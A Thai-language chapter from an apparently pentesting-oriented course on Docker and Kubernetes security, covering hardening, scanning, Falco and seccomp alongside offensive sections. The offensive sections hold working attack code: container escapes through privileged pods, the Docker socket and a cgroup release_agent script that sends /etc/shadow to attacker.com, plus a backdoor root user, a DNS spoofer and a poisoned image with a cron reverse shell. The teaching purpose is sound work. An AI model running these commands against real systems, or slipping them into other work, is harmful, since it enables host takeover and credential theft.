# Part 55: Container Security (ความปลอดภัยของ Container)

## สารบัญ
1. [Docker Security Fundamentals](#1-docker-security-fundamentals)
2. [Docker Security Scanning](#2-docker-security-scanning)
3. [Kubernetes Security](#3-kubernetes-security)
4. [Container Escape Techniques](#4-container-escape-techniques)
5. [Docker Network Security](#5-docker-network-security)
6. [Registry Security](#6-registry-security)
7. [Runtime Security](#7-runtime-security)
8. [Container Hardening](#8-container-hardening)
9. [แบบฝึกหัด Lab](#9-แบบฝึกหัด-lab)

---

## 1. Docker Security Fundamentals

### 1.1 Docker Architecture Security

```
Docker Architecture:

Host OS (Kernel)
└── Docker Daemon (dockerd)      <- privileged process
    └── containerd              <- container runtime
        └── runc               <- OCI runtime
            └── Container 1    <- isolated process
            └── Container 2

Security layers:
1. Kernel namespaces (isolation)
2. cgroups (resource limits)
3. Capabilities (privilege control)
4. Seccomp (syscall filtering)
5. AppArmor/SELinux (MAC)
6. User namespaces (UID mapping)
```

### 1.2 Docker Security Check

```bash
# ตรวจสอบ Docker security configuration
docker info | grep -E 'Security|Seccomp|AppArmor|SELinux'

# Docker Bench Security
docker run --rm --net host --pid host --userns host --cap-add audit_control \
    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
    -v /etc:/etc:ro \
    -v /usr/bin/containerd:/usr/bin/containerd:ro \
    -v /usr/bin/runc:/usr/bin/runc:ro \
    -v /usr/lib/systemd:/usr/lib/systemd:ro \
    -v /var/lib:/var/lib:ro \
    -v /var/run/docker.sock:/var/run/docker.sock:ro \
    docker/docker-bench-security

# ตรวจสอบ running containers
docker ps --all
docker inspect <container_id> | python3 -c "
import json, sys
data = json.load(sys.stdin)
for c in data:
    print('=== Container:', c['Name'])
    print('Privileged:', c['HostConfig']['Privileged'])
    print('Capabilities:', c['HostConfig']['CapAdd'])
    print('Volumes:', list(c['HostConfig']['Binds'] or []))
    print('Network:', c['HostConfig']['NetworkMode'])
"

# ตรวจสอบ user ใน container
docker inspect <container_id> | grep -E '"User"|"RunAsUser"'
```

### 1.3 Dangerous Docker Flags

```bash
# --privileged: ให้สิทธิ์ เทียบเท่า root บน host
docker run --privileged ubuntu bash

# --net=host: share network namespace
docker run --net=host ubuntu bash

# -v /:/mnt: mount host root
docker run -v /:/mnt ubuntu bash

# -v /var/run/docker.sock: mount Docker socket
docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu bash

# --pid=host: share process namespace
docker run --pid=host ubuntu bash

# --ipc=host: share IPC namespace
docker run --ipc=host ubuntu bash

# --cap-add ALL: add all capabilities
docker run --cap-add ALL ubuntu bash

# วิธีใช้งานที่ปลอดภัย
# ไม่ควรใช้ --privilegedเลยถ้าไม่จำเป็น
docker run --cap-add=NET_BIND_SERVICE ubuntu bash  # specific capability only
```

---

## 2. Docker Security Scanning

### 2.1 Image Vulnerability Scanning

```bash
# Trivy สคัน Docker image
trivy image ubuntu:latest
trivy image --severity HIGH,CRITICAL ubuntu:latest
trivy image --format json ubuntu:latest > report.json

# สคัน local image
trivy image myapp:latest

# สคัน Dockerfile
trivy config ./Dockerfile

# สคัน docker-compose.yml
trivy config ./docker-compose.yml

# Snyk
snyk container test ubuntu:latest
snyk container test --file=Dockerfile .

# Clair
# ติดตั้ง Clair server
docker run -p 6060:6060 -p 6061:6061 quay.io/projectquay/clair:latest

# Anchore
docker run -p 8228:8228 anchore/anchore-engine:latest
anchore-cli image add ubuntu:latest
anchore-cli image wait ubuntu:latest
anchore-cli image vuln ubuntu:latest all
```

### 2.2 Dockerfile Best Practices

```dockerfile
# ตัวอย่าง Dockerfile ที่ปลอดภัย
# bad_dockerfile (DON'T DO THIS)
FROM ubuntu:latest          # ใช้ latest
RUN apt-get update && apt-get install -y everything  # too many packages
ADD https://example.com/app.tar.gz /app  # ดาวน์โหลดจาก HTTP!
COPY . /app                # copy ทั้ง directory รวมถึง secrets!
RUN chmod 777 /app         # world writable!
CMD ["/bin/bash"]          # ไม่ระบุ user

---

# good_dockerfile (BEST PRACTICES)
# Multi-stage build
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production  # install only production deps
COPY src/ ./src/
RUN npm run build

# Final stage: minimal image
FROM node:18-alpine

# Run as non-root user
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

WORKDIR /app

# Copy only what's needed
COPY --from=builder --chown=appuser:appgroup /app/dist ./dist
COPY --from=builder --chown=appuser:appgroup /app/node_modules ./node_modules

# Set ownership
RUN chmod -R 550 /app

# Use specific version tags
USER appuser:appgroup

# Health check
HEALTHCHECK --interval=30s --timeout=3s CMD wget -qO- http://localhost:3000/health || exit 1

EXPOSE 3000
CMD ["node", "dist/index.js"]
```

### 2.3 Docker Compose Security

```yaml
# docker-compose-secure.yml
version: '3.8'

services:
  web:
    image: nginx:1.25.3-alpine  # pin specific version
    read_only: true              # read-only filesystem
    user: "1001:1001"           # non-root user
    cap_drop:
      - ALL                     # drop all capabilities
    cap_add:
      - NET_BIND_SERVICE        # only what's needed
    security_opt:
      - no-new-privileges:true  # prevent privilege escalation
      - apparmor:docker-nginx   # AppArmor profile
    tmpfs:
      - /tmp                    # writable /tmp in memory
      - /var/cache/nginx        # nginx cache
      - /var/run               # nginx pid files
    environment:
      - NODE_ENV=production
    secrets:
      - db_password             # use Docker secrets
    networks:
      - frontend
    ports:
      - "127.0.0.1:80:80"      # bind to localhost only
    
  db:
    image: postgres:16.1-alpine
    read_only: true
    user: "999:999"
    cap_drop:
      - ALL
    security_opt:
      - no-new-privileges:true
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password
    volumes:
      - postgres_data:/var/lib/postgresql/data
    networks:
      - backend

# Docker Secrets (encrypted at rest)
secrets:
  db_password:
    external: true  # or file: ./secrets/db_password.txt

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # no external access!

volumes:
  postgres_data:
```

---

## 3. Kubernetes Security

### 3.1 Kubernetes Security Assessment

```bash
# ติดตั้ง tools
kubectl version
kubeaudit all  # security audit
kubebench     # CIS Benchmark
kubehunter    # vulnerability scanning

# kube-bench: CIS Kubernetes Benchmark
docker run --rm -v /etc:/etc:ro -v /var:/var:ro -v /proc:/proc:ro \
    --net=host --pid=host \
    aquasec/kube-bench:latest

# kube-hunter: หาช่องโหว่ใน cluster
pip3 install kube-hunter
kube-hunter --remote 10.0.0.1  # scan from outside
kube-hunter --pod               # scan from inside a pod

# Enum cluster info
kubectl get nodes -o wide
kubectl get namespaces
kubectl get pods --all-namespaces
kubectl get services --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl get secrets --all-namespaces

# ตรวจสอบ RBAC
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --namespace kube-system

# หา privileged pods
kubectl get pods --all-namespaces -o json | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data['items']:
    name = item['metadata']['name']
    ns = item['metadata']['namespace']
    for container in item['spec']['containers']:
        sc = container.get('securityContext', {})
        if sc.get('privileged'):
            print(f'PRIVILEGED: {ns}/{name} -> {container[\"name\"]}') 
"
```

### 3.2 Kubernetes Pod Security

```yaml
# secure-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1001
    runAsGroup: 1001
    fsGroup: 1001
    seccompProfile:
      type: RuntimeDefault
  
  containers:
  - name: app
    image: myapp:1.0.0
    
    securityContext:
      allowPrivilegeEscalation: false  # สำคัญ!
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
        add:
          - NET_BIND_SERVICE  # เฉพาะที่จำเป็น
    
    resources:
      limits:
        cpu: "500m"
        memory: "256Mi"
      requests:
        cpu: "100m"
        memory: "128Mi"
    
    volumeMounts:
    - mountPath: /tmp
      name: tmp-volume
    - mountPath: /var/cache
      name: cache-volume
  
  volumes:
  - name: tmp-volume
    emptyDir: {}  # ephemeral, not mounted from host
  - name: cache-volume
    emptyDir: {}
  
  automountServiceAccountToken: false  # สำคัญ!
  hostNetwork: false
  hostPID: false
  hostIPC: false
```

### 3.3 Kubernetes RBAC Attack

```bash
# หา service accounts ที่มีสิทธิ์มากเกินไป
kubectl get clusterrolebindings -o json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data['items']:
    role = item.get('roleRef', {}).get('name', '')
    if 'admin' in role or 'cluster-admin' in role:
        print(f'Privileged binding: {item[\"metadata\"][\"name\"]} -> {role}')
        subjects = item.get('subjects', [])
        for s in subjects:
            print(f'  Subject: {s.get(\"kind\")} {s.get(\"name\")} in {s.get(\"namespace\", \"cluster-wide\")}')
"

# ถ้า pod สามารถ create pods หรือแก้ไข rolebindings
# อาจสามารถ escalate สิทธิ์ได้

# สร้าง privileged pod เพื่อ escape to host
cat > privesc-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/sh"]
    args: ["-c", "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"]
    securityContext:
      privileged: true
  hostPID: true
  hostNetwork: true
EOF
kubectl apply -f privesc-pod.yaml
kubectl exec -it privesc -- bash
```

### 3.4 Kubernetes Secret Exfiltration

```bash
# อ่าน secrets (ถ้ามีสิทธิ์)
kubectl get secret -n kube-system
kubectl get secret <secret-name> -o yaml
# decode base64
kubectl get secret <name> -o jsonpath='{.data.password}' | base64 -d

# หา secrets แบบ bulk
kubectl get secrets --all-namespaces -o json | \
    python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for item in data['items']:
    name = item['metadata']['name']
    ns = item['metadata']['namespace']
    secret_data = item.get('data', {})
    if secret_data:
        print(f'=== {ns}/{name} ===')
        for k, v in secret_data.items():
            try:
                decoded = base64.b64decode(v).decode()
                print(f'  {k}: {decoded[:50]}...' if len(decoded) > 50 else f'  {k}: {decoded}')
            except:
                print(f'  {k}: [binary data]')
"

# ถ้าอยู่ใน pod: อ่าน service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# ใช้ token เรียก API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
KUBE_API=https://kubernetes.default.svc
curl -k -H "Authorization: Bearer $TOKEN" $KUBE_API/api/v1/namespaces
```

---

## 4. Container Escape Techniques

### 4.1 Docker Socket Escape

```bash
# ตรวจสอบว่ามี Docker socket
ls -la /var/run/docker.sock

# Mount host filesystem ผ่าน new container
docker run --rm -v /:/host ubuntu chroot /host bash

# หรือใช้ curl ติดต่อ API
curl -s --unix-socket /var/run/docker.sock \
    'http://localhost/v1.41/containers/json' | python3 -m json.tool

# สร้าง container ใหม่แบบ privileged
curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q",
                    "OpenStdin":true,"Tty":true,
                    "HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}' \
    'http://localhost/v1.41/containers/create?name=escape'

curl -s --unix-socket /var/run/docker.sock -X POST \
    'http://localhost/v1.41/containers/escape/start'
```

### 4.2 Privileged Container Escape

```bash
# ตรวจสอบ
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = privileged

# Mount host block device
fdisk -l
mkdir /mnt/host_escape
mount /dev/xvda1 /mnt/host_escape
ls /mnt/host_escape

# อ่าน /etc/shadow จาก host
cat /mnt/host_escape/etc/shadow

# เพิ่ม backdoor user
echo 'hacker:$1$hacked$...:0:0::/root:/bin/bash' >> /mnt/host_escape/etc/passwd

# Chroot เข้าไป host
chroot /mnt/host_escape /bin/bash
whoami  # root
```

### 4.3 Namespace Escape

```bash
# nsenter เข้าไป host namespaces
# ต้องการ --pid=host หรือเห็น /proc ของ host PID 1

# ถ้าอยู่ใน container ที่ share pid namespace
nsenter --mount=/proc/1/ns/mnt -- /bin/bash

# หรือ enter all host namespaces
nsenter -t 1 -m -u -i -n -p -- /bin/bash
# -t 1: target PID 1 (init)
# -m: mount namespace
# -u: UTS namespace
# -i: IPC namespace
# -n: network namespace
# -p: PID namespace
```

### 4.4 cgroup Escape

```bash
#!/bin/bash
# cgroup_escape.sh
# ต้องการ privileged container

set -euo pipefail

echo "[+] Mounting cgroup"
mkdir -p /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x

echo "[+] Setting notify_on_release"
echo 1 > /tmp/cgrp/x/notify_on_release

# หา host path
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n1)
echo "[*] Host path: $host_path"

echo "[+] Setting release_agent"
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# สร้าง command บน host
cat > /cmd << 'EOF'
#!/bin/bash
curl -sk http://attacker.com/$(cat /etc/shadow | base64 -w0) &
EOF
chmod a+x /cmd

echo "[+] Triggering cgroup release"
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
echo "[+] Exploit executed!"

# Cleanup
umount /tmp/cgrp
rm -rf /tmp/cgrp /cmd
```

---

## 5. Docker Network Security

### 5.1 Network Isolation

```bash
# ดู Docker networks
docker network ls
docker network inspect bridge

# สร้าง isolated network
docker network create --driver bridge \
    --subnet=172.20.0.0/16 \
    --ip-range=172.20.240.0/20 \
    --opt com.docker.network.bridge.enable_icc=false \
    --opt com.docker.network.bridge.enable_ip_masquerade=true \
    isolated_network

# สร้าง internal network (ไม่มี internet access)
docker network create --internal private_network

# Network scanning จากภายใน container
nmap -sn 172.17.0.0/16  # scan docker bridge network

# ดู containers ใน network
docker network inspect <network_name> | python3 -c "
import json, sys
data = json.load(sys.stdin)
for net in data:
    print('Network:', net['Name'])
    for cid, cinfo in net.get('Containers', {}).items():
        print(f'  Container: {cinfo[\"Name\"]} @ {cinfo[\"IPv4Address\"]}')
"
```

### 5.2 Container Network Attacks

```bash
# ARP Spoofing ภายใน Docker network
# ตอน: containers สองตัวอยู่ใน bridge network เดียวกัน

# arp spoofing
apt-get install arpspoof -y
arp -n  # ดู ARP table
arpspoof -i eth0 -t 172.17.0.3 172.17.0.1  # spoof gateway

# intercept traffic
tcpdump -i eth0 -w /tmp/capture.pcap

# DNS Spoofing
python3 -c "
import scapy.all as sc

def dns_spoof(pkt):
    if pkt.haslayer(sc.DNSQR) and pkt[sc.DNS].qr == 0:
        qname = pkt[sc.DNSQR].qname
        if b'target.com' in qname:
            spoofed = sc.IP(src=pkt[sc.IP].dst, dst=pkt[sc.IP].src) / \
                     sc.UDP(sport=53, dport=pkt[sc.UDP].sport) / \
                     sc.DNS(id=pkt[sc.DNS].id, qr=1, aa=1, qd=pkt[sc.DNS].qd,
                           an=sc.DNSRR(rrname=qname, rdata='10.10.10.1'))
            sc.send(spoofed, verbose=False)
            print(f'Spoofed: {qname}')

sc.sniff(filter='udp port 53', prn=dns_spoof)
"
```

---

## 6. Registry Security

### 6.1 Registry Attack Techniques

```bash
# ค้นหา exposed registries
nmap -p 5000 --open 10.0.0.0/24

# เข้าถึง registry แบบ anonymous
curl -s http://registry.target.com:5000/v2/
curl -s http://registry.target.com:5000/v2/_catalog
curl -s http://registry.target.com:5000/v2/webapp/tags/list

# Pull image จาก unsecured registry
docker pull registry.target.com:5000/webapp:latest

# วิเคราะห์ image เพื่อหา secrets
docker save registry.target.com:5000/webapp -o webapp.tar
mkdir extracted
cd extracted && tar xf ../webapp.tar
find . -type f | xargs grep -l 'password\|secret\|key\|token' 2>/dev/null

# Dive: วิเคราะห์ image layers
dive registry.target.com:5000/webapp:latest
```

### 6.2 Poison Image Attack

```bash
# เสนอตัวอย่าง: supply chain attack ผ่าน Docker image
# attacker สร้าง image ที่มีชื่อเหมือน official image

# สร้าง malicious Dockerfile
cat > Dockerfile.evil << 'EOF'
FROM ubuntu:22.04

# เพิ่ม backdoor
RUN useradd -m -s /bin/bash -G sudo backdoor && \
    echo 'backdoor:hacked' | chpasswd && \
    echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# Reverse shell เมื่อ container เริ่มทำงาน
RUN echo '* * * * * root bash -i >& /dev/tcp/10.10.10.1/4444 0>&1' >> /etc/crontab

CMD ["/bin/bash"]
EOF

# Build และ push ไปยัง registry
docker build -f Dockerfile.evil -t ubuntu:22.04 .
docker push registry.internal/ubuntu:22.04
```

---

## 7. Runtime Security

### 7.1 Falco - Container Runtime Security

```bash
# ติดตั้ง Falco
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
sudo apt-get install falco

# ตั้งค่า Falco rules (/etc/falco/falco_rules.yaml)
```

```yaml
# custom_falco_rules.yaml

# Rule: Detect shell spawn in container
- rule: Terminal Shell in Container
  desc: A shell was spawned in a container
  condition: >
    spawned_process and container
    and shell_procs
    and proc.tty != 0
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
     image=%container.image.repository:%container.image.tag
     shell=%proc.name parent=%proc.pname)
  priority: WARNING

# Rule: Detect privilege escalation
- rule: Privilege Escalation via Sudo
  desc: A process gained elevated privileges via sudo
  condition: >
    spawned_process
    and proc.pname = sudo
    and proc.name in (sh, bash, zsh)
  output: >
    Privilege escalation via sudo
    (user=%user.name process=%proc.name parent=%proc.pname
     container=%container.name)
  priority: ERROR

# Rule: Sensitive file access
- rule: Read Sensitive Files
  desc: Attempt to read sensitive files
  condition: >
    open_read
    and (fd.name in (sensitive_files)
         or fd.directory in (sensitive_dirs))
    and not trusted_processes
  output: >
    Sensitive file opened
    (user=%user.name file=%fd.name
     command=%proc.cmdline container=%container.name)
  priority: WARNING

# Rule: Container with mounted /proc
- rule: Proc Mount in Container
  desc: /proc from host mounted into container
  condition: >
    container
    and (evt.type = mount
         and evt.arg.target contains "/proc")
  output: >
    Host /proc mounted in container
    (container=%container.name command=%proc.cmdline)
  priority: CRITICAL

# Rule: Suspicious binary execution  
- rule: Suspicious Binary in Container
  desc: Known attack tools executed in container
  condition: >
    spawned_process
    and container
    and proc.name in (nmap, masscan, metasploit, msfconsole,
                      nikto, sqlmap, hydra, hashcat, john)
  output: >
    Attack tool executed in container!
    (user=%user.name binary=%proc.name
     container=%container.name)
  priority: CRITICAL
```

```bash
# Start Falco
sudo systemctl start falco
sudo journalctl -fu falco

# ดู logs
tail -f /var/log/falco.log
```

### 7.2 Sysdig - Container Monitoring

```bash
# ติดตั้ง sysdig
curl -s https://s3.amazonaws.com/download.draios.com/stable/install-sysdig | sudo bash

# Monitor Docker activities
sudo sysdig -pc container.name=webapp

# ดู file operations
sudo sysdig -pc -A "proc.name=nginx and (evt.type=open or evt.type=write)"

# ดู network connections
sudo sysdig -pc -A "evt.type=connect and container.name=webapp"

# Record และ replay
sudo sysdig -pc -w /tmp/trace.scap
sudo sysdig -r /tmp/trace.scap
```

---

## 8. Container Hardening

### 8.1 Seccomp Profiles

```json
// seccomp_profile.json - restrict syscalls
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "close", "fstat", "lseek",
        "mmap", "mprotect", "munmap", "brk",
        "access", "open", "openat", "stat",
        "execve", "exit", "exit_group",
        "nanosleep", "getpid", "getuid", "getgid",
        "socket", "connect", "accept", "sendto",
        "recvfrom", "bind", "listen", "getsockname",
        "clone", "fork", "wait4", "kill",
        "getcwd", "chdir",
        "prctl", "arch_prctl",
        "set_robust_list", "set_tid_address",
        "poll", "epoll_create1", "epoll_ctl", "epoll_wait",
        "rt_sigaction", "rt_sigprocmask", "rt_sigreturn",
        "futex", "ioctl", "fcntl",
        "dup", "dup2", "pipe", "pipe2"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```bash
# ใช้ seccomp profile
docker run --security-opt seccomp=seccomp_profile.json nginx

# ปิด seccomp (อันตราย!)
docker run --security-opt seccomp=unconfined ubuntu bash
```

### 8.2 AppArmor Profile

```
# /etc/apparmor.d/docker-nginx
#include <tunables/global>

profile docker-nginx flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  
  # Deny network raw sockets
  deny network raw,
  deny network packet,
  
  # Deny write to sensitive dirs
  deny /proc/** w,
  deny /sys/** w,
  deny /dev/** w,
  
  # Allow nginx operations
  /var/log/nginx/** rw,
  /etc/nginx/** r,
  /usr/share/nginx/** r,
  
  # Deny execution of shells
  deny /bin/bash x,
  deny /bin/sh x,
  deny /usr/bin/python* x,
  deny /usr/bin/perl* x,
  
  # Network
  network tcp,
  network udp,
}
```

```bash
# Load AppArmor profile
sudo apparmor_parser -r /etc/apparmor.d/docker-nginx

# ใช้กับ Docker
docker run --security-opt apparmor=docker-nginx nginx

# ตรวจสอบ status
sudo apparmor_status | grep nginx
```

### 8.3 Container Security Checklist

```bash
#!/bin/bash
# container_security_audit.sh

CONTAINER_ID=$1

echo "====== Container Security Audit ======"
echo "Container: $CONTAINER_ID"
echo ""

# Check privileged
PRIVILEGED=$(docker inspect $CONTAINER_ID --format '{{.HostConfig.Privileged}}')
[ "$PRIVILEGED" = "true" ] && echo "[!] FAIL: Privileged container!" || echo "[+] PASS: Not privileged"

# Check user
USER=$(docker inspect $CONTAINER_ID --format '{{.Config.User}}')
[ -z "$USER" ] && echo "[!] WARN: Running as root!" || echo "[+] PASS: Running as $USER"

# Check read-only filesystem
READONLY=$(docker inspect $CONTAINER_ID --format '{{.HostConfig.ReadonlyRootfs}}')
[ "$READONLY" = "true" ] && echo "[+] PASS: Read-only filesystem" || echo "[!] WARN: Writable filesystem"

# Check capabilities
CAP_ADD=$(docker inspect $CONTAINER_ID --format '{{.HostConfig.CapAdd}}')
CAP_DROP=$(docker inspect $CONTAINER_ID --format '{{.HostConfig.CapDrop}}')
echo "Capabilities Added: $CAP_ADD"
echo "Capabilities Dropped: $CAP_DROP"

# Check network mode
NETWORK=$(docker inspect $CONTAINER_ID --format '{{.HostConfig.NetworkMode}}')
[ "$NETWORK" = "host" ] && echo "[!] FAIL: Host network mode!" || echo "[+] PASS: Isolated network: $NETWORK"

# Check sensitive mounts
docker inspect $CONTAINER_ID --format '{{range .HostConfig.Binds}}{{.}}{{"\n"}}{{end}}' | \
    while read mount; do
        echo "$mount" | grep -qE '(docker.sock|/proc|/sys|/dev|/etc)' && \
            echo "[!] FAIL: Sensitive mount: $mount" || true
    done

# Check PID/IPC/UTS namespace
PID_MODE=$(docker inspect $CONTAINER_ID --format '{{.HostConfig.PidMode}}')
[ "$PID_MODE" = "host" ] && echo "[!] FAIL: Host PID namespace!" || echo "[+] PASS: Isolated PID namespace"

echo ""
echo "====== Audit Complete ======"
```

---

## 9. แบบฝึกหัด Lab

### Lab 1: Docker Security Audit

```bash
# ติดตั้ง vulnerable environment
cat > docker-compose-lab.yml << 'EOF'
version: '3'
services:
  vuln_web:
    image: webgoat/goat-and-wolf
    ports:
      - "8080:8080"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # vulnerable!
    privileged: true  # vulnerable!
EOF

docker-compose -f docker-compose-lab.yml up -d

# Audit
bash container_security_audit.sh vuln_web

# Fix issues และ audit อีกครั้ง
```

### Lab 2: Exploit Docker Socket

```bash
# เซ็ตอัพ container ที่หลุมตัว Docker socket
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu bash

# ภายใน container:
apt update && apt install -y docker.io

# Escape to host
docker run --rm -v /:/mnt --privileged ubuntu chroot /mnt bash

# ตอนนี้อยู่ใน host root!
whoami  # root
cat /etc/shadow
```

### Lab 3: Kubernetes RBAC Attack

```bash
# Setup vulnerable RBAC
cat > vuln-rbac.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: vuln-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin  # ให้ cluster-admin!
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
EOF

kubectl apply -f vuln-rbac.yaml

# Attack from pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/secrets

# สร้าง privileged pod
kubectl apply -f privesc-pod.yaml
kubectl exec -it privesc -- bash
nsenter -t 1 -m -u -i -n -p -- bash
whoami  # root on host!
```

### สรุป Container Security

| แนวทาง | ประโยชน์ |
|--------|----------|
| Non-root user | ลด attack surface |
| Read-only filesystem | ป้องกันการแก้ไข |
| Drop capabilities | ลด privilege |
| Seccomp profile | ปัด syscalls |
| AppArmor | MAC policy |
| Network policies | isolate containers |
| Image scanning | เจอ CVEs ก่อน deploy |
| Runtime monitoring (Falco) | detect anomalies |

---

← [Part 54: Advanced PrivEsc](Part-54-Advanced-PrivEsc.md) | [Part 56: Mobile Application Security](Part-56-Mobile-Security.md) →
